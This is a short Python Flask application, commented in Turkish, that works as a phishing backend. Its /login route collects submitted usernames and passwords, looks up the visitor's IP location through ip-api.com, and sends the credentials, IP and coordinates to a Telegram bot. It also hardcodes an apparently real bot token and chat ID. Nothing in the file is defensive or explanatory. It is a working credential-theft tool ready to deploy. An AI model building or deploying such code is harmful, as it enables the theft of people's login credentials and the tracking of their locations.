from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# 🚀 Telegram Bot Bilgileri (BURAYI DÜZENLE)
TELEGRAM_BOT_TOKEN = "8053892828:AAH9YMbrFiSchpri9wpV5FkOAevfIsaMUj4"  # 🔴 Buraya kendi bot token'ını yaz
CHAT_ID = "7107883815"  # 🔴 Buraya kendi chat ID'ni yaz

def send_telegram_message(message):
    """Telegram'a mesaj gönderen fonksiyon"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, data=data)

def get_location(ip):
    """IP adresinden konum bilgisi alma"""
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url).json()
    
    if response.get("status") == "success":
        return response
    return None

@app.route('/')
def index():
    """Ana Sayfa"""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Kullanıcı giriş bilgilerini alıp Telegram'a gönderen route"""
    username = request.form.get('username')  # Kullanıcı adı
    password = request.form.get('password')  # Şifre

    # 🔥 Gerçek IP adresini almak için güncellendi
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    location = get_location(user_ip)  # IP'den konum bilgisi al

    if location and "city" in location and "country" in location:
        location_text = f"{location['city']}, {location['country']} (Lat: {location['lat']}, Lon: {location['lon']})"
    else:
        location_text = "Konum alınamadı"

    # 📩 Telegram'a Gönderilecek Mesaj
    message = f"""
📩 *Yeni Giriş* 📩
👤 *Kullanıcı Adı:* `{username}`
🔑 *Şifre:* `{password}`
🌍 *IP:* `{user_ip}`
📍 *Konum:* {location_text}
"""
    send_telegram_message(message)  # Telegram'a mesaj gönder
    
    return "Giriş yapılıyor...", 200

if __name__ == '__main__':
    app.run(debug=True)
